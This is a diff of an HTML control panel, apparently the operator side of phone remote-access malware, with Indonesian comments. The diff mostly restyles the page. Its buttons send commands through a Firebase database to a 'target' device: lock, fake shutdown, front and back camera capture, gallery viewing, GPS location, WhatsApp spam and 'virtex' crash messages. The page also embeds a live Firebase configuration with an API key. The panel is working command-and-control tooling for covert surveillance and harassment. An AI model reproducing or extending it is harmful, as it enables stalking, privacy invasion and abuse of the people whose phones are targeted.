@@ -2,44 +2,116 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WIDSEVERLY OMNI V12 - FULL AUDIO</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>REMOTE CONTROL</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        :root { --neon-red: #ff0033; --neon-blue: #00ffff; }
-        body { background: #000; color: #fff; font-family: 'Orbitron', sans-serif; margin: 0; overflow: hidden; }
-        #video-bg { position: fixed; top: 0; left: 0; min-width: 100%; min-height: 100%; z-index: -1; filter: brightness(40%); object-fit: cover; }
-        header { background: rgba(0,0,0,0.8); padding: 15px; border-bottom: 2px solid var(--neon-red); text-align: center; box-shadow: 0 0 20px var(--neon-red); }
-        .main-panel { padding: 15px; max-width: 600px; margin: auto; position: relative; z-index: 10; }
-        .control-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-top: 20px; }
-        .btn-gacor { background: rgba(10, 10, 10, 0.7); border: 1.5px solid #444; border-radius: 12px; aspect-ratio: 1/1; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; transition: 0.2s; backdrop-filter: blur(5px); }
-        .btn-gacor:active { transform: scale(0.9); box-shadow: 0 0 15px var(--neon-red); }
-        .btn-gacor i { font-size: 1.5rem; margin-bottom: 5px; }
-        #status-log { background: rgba(0,0,0,0.8); border: 1px solid #333; height: 70px; font-size: 0.6rem; padding: 8px; margin-top: 10px; color: #0f0; font-family: monospace; overflow-y: auto; border-left: 3px solid var(--neon-red); }
+        :root { --neon-red: #ff0033; --neon-blue: #00ffff; --neon-purple: #f0f; --neon-yellow: #ff0; }
+        
+        body, html { 
+            background: #000; color: #fff; font-family: 'Orbitron', sans-serif; 
+            margin: 0; padding: 0; width: 100%; height: 100%; overflow-x: hidden; 
+        }
+
+        header { 
+            background: #000; padding: 15px; border-bottom: 1px solid #1a1a1a; 
+            text-align: center; position: sticky; top: 0; z-index: 100;
+        }
+
+        /* BANNER VIDEO ATAS - REVISI VISUAL */
+        .video-banner {
+            width: 100%;
+            background: #000;
+            border-bottom: 3px solid var(--neon-red);
+            overflow: hidden;
+            line-height: 0;
+            box-shadow: 0 5px 15px rgba(255, 0, 51, 0.4);
+        }
+
+        #header-video {
+            width: 100%;
+            height: auto;
+            max-height: 240px; /* Ukuran banner ideal */
+            object-fit: cover;
+        }
+
+        .main-panel { 
+            padding: 15px; 
+            max-width: 500px; 
+            margin: auto; 
+            background: #000;
+        }
+
+        #status-log { 
+            background: #050505; border: 1px solid #1a1a1a; height: 70px; 
+            font-size: 0.7rem; padding: 10px; margin: 10px 0; color: #0f0;
+            font-family: monospace; overflow-y: auto; border-left: 4px solid var(--neon-red);
+            border-radius: 4px;
+        }
+
+        /* GRID TOMBOL BERSIH (CLEAN UI) */
+        .control-grid { 
+            display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-top: 15px; 
+        }
+
+        .btn-gacor {
+            background: #0a0a0a; border: 1px solid #333; border-radius: 12px;
+            aspect-ratio: 1/1; display: flex; flex-direction: column; align-items: center; 
+            justify-content: center; cursor: pointer; transition: 0.1s;
+        }
+
+        .btn-gacor:active { background: #1a1a1a; transform: scale(0.95); border-color: var(--neon-red); }
+        .btn-gacor i { font-size: 1.8rem; margin-bottom: 8px; }
+        .btn-gacor span { font-size: 0.65rem; font-weight: bold; color: #fff; text-align: center; letter-spacing: 1px; }
+
+        .btn-red { border-color: #500; color: var(--neon-red); }
+        .btn-blue { border-color: #004; color: var(--neon-blue); }
+        .btn-purple { border-color: #404; color: var(--neon-purple); }
+        .btn-yellow { border-color: #440; color: var(--neon-yellow); }
+
     </style>
 </head>
 <body onclick="enableAudio()">
-    <video autoplay loop playsinline id="video-bg"><source src="https://github.com/hehehedihd-tech/Kalkulator-cyber/raw/refs/heads/main/VID_20260511_195624_258.mp4" type="video/mp4"></video>
-    <header><h2 style="margin:0; font-size: 1.1rem; letter-spacing: 2px;">WIDSEVERLY OMNI-REMOTE</h2></header>
+
+    <header>
+        <h2 style="margin:0; font-size: 1rem; letter-spacing: 5px; color: #fff; font-weight: 700;">REMOTE CONTROL</h2>
+    </header>
+
+    <!-- VIDEO BANNER (1000221057.mp4) -->
+    <div class="video-banner">
+        <video autoplay loop playsinline id="header-video">
+            <source src="https://github.com/hehehedihd-tech/Kalkulator-cyber/raw/refs/heads/main/VID_20260511_195624_258.mp4" type="video/mp4">
+        </video>
+    </div>
+
     <div class="main-panel">
-        <div id="status-log">System Audio: READY. Tap to enable Sound.<br>> Waiting for target...</div>
+        <div id="status-log">> WIDSEVERLY OMNI V12<br>> Status: Online & Secure<br>> Tap screen to unmute video</div>
+
         <div class="control-grid">
-            <div class="btn-gacor" style="border-color:var(--neon-red);" onclick="send('lock')"><i>🔒</i><span>LOCK HP</span></div>
-            <div class="btn-gacor" style="border-color:var(--neon-red);" onclick="send('unlock')"><i>🔓</i><span>UNLOCK</span></div>
-            <div class="btn-gacor" style="border-color:var(--neon-red);" onclick="send('fake_shutdown')"><i>🔌</i><span>OFF</span></div>
-            <div class="btn-gacor" style="border-color:var(--neon-blue);" onclick="send('camera_front')"><i>📸</i><span>FR-CAM</span></div>
-            <div class="btn-gacor" style="border-color:var(--neon-blue);" onclick="send('camera_back')"><i>📷</i><span>BK-CAM</span></div>
-            <div class="btn-gacor" style="border-color:var(--neon-blue);" onclick="send('view_gallery')"><i>🖼️</i><span>GALLERY</span></div>
-            <div class="btn-gacor" style="color:#f0f; border-color:#f0f;" onclick="send('wa_spam')"><i>💥</i><span>WA SPAM</span></div>
-            <div class="btn-gacor" style="color:#f0f; border-color:#f0f;" onclick="send('virtex')"><i>💀</i><span>VIRTEX</span></div>
-            <div class="btn-gacor" style="color:#ff0; border-color:#ff0;" onclick="send('location')"><i>📍</i><span>GPS</span></div>
+            <div class="btn-gacor btn-red" onclick="send('lock')"><i>🔒</i><span>LOCK HP</span></div>
+            <div class="btn-gacor btn-red" onclick="send('unlock')"><i>🔓</i><span>UNLOCK</span></div>
+            <div class="btn-gacor btn-red" onclick="send('fake_shutdown')"><i>🔌</i><span>OFF</span></div>
+
+            <div class="btn-gacor btn-blue" onclick="send('camera_front')"><i>📸</i><span>FR-CAM</span></div>
+            <div class="btn-gacor btn-blue" onclick="send('camera_back')"><i>📷</i><span>BK-CAM</span></div>
+            <div class="btn-gacor btn-blue" onclick="send('view_gallery')"><i>🖼️</i><span>GALLERY</span></div>
+
+            <div class="btn-gacor btn-purple" onclick="send('wa_spam')"><i>💥</i><span>WA SPAM</span></div>
+            <div class="btn-gacor btn-purple" onclick="send('virtex')"><i>💀</i><span>VIRTEX</span></div>
+            <div class="btn-gacor btn-yellow" onclick="send('location')"><i>📍</i><span>GPS</span></div>
         </div>
     </div>
+
 <script>
-    const video = document.getElementById('video-bg');
-    function enableAudio() { video.muted = false; video.volume = 1.0; video.play(); }
+    const video = document.getElementById('header-video');
+    function enableAudio() { 
+        video.muted = false; 
+        video.volume = 1.0; 
+        video.play();
+    }
+
     const firebaseConfig = {
         apiKey: "AIzaSyAS9ZCVt6iFXY8Ksd0o5z7fjXg3qi8rfhU",
         authDomain: "remote-control-9bf2c.firebaseapp.com",
@@ -49,9 +121,20 @@
         messagingSenderId: "71798344189",
         appId: "1:71798344189:web:6cdb414c1eab16c6b9b194"
     };
+
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-    function send(act) { db.ref('targets/Target_User_1/command').update({ action: act, time: Date.now() }).then(() => { document.getElementById('status-log').innerHTML += `> Command [${act}] sent...<br>`; }); }
+
+    function send(act) {
+        const log = document.getElementById('status-log');
+        db.ref('targets/Target_User_1/command').update({
+            action: act,
+            time: Date.now()
+        }).then(() => {
+            log.innerHTML += `> CMD [${act}] EXECUTED...<br>`;
+            log.scrollTop = log.scrollHeight;
+        });
+    }
 </script>
 </body>
 </html>
